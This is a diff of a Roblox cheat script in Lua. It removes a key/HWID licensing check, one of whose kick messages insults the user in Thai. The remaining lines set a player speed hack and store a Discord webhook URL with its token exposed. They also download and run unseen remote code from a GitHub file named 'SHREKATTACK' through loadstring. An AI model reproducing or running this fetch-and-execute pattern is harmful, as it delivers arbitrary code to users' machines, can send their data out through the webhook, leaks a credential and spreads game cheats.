@@ -33,22 +33,7 @@ Section:NewButton("Click To decrease speed", "", function()
     game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 20
 end)
 
--- KEY | HWID
 
-local Server =  http_request({
-    Url = "http://127.0.0.1/Whitelist/Server.php?Key=".. _G.Key .."&HWID="..HWID,
-    Method = "GET"
-}).Body
-
-if Server == "WHITELIST !" then
-    print("SCRIPT")
-elseif Server == "Invaid HWID !" then
-    game.Players.LocalPlayer:kick("Invaid HWID")
-elseif Server == "Invaid Key" then
-    game.Players.LocalPlayer:kick("Invaid Key มึงไม่ซื้อKeyแล้วมึงจะรันทำเหี้ยไร")
-else
-    game.Players.LocalPlayer:kick("Invaid Key")
-end
 
 _G.webhooksdiscord = "https://discord.com/api/webhooks/936617629853036544/7XkSFc1BHzOYSnSnOClLGN66a5ta0-1YOYIRoQvUogaCerg6dBRTucRCUkme4nMi-vb1"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/SHARKX516/SHREKATTACK/main/SHARKLOL2.lua"),true)()
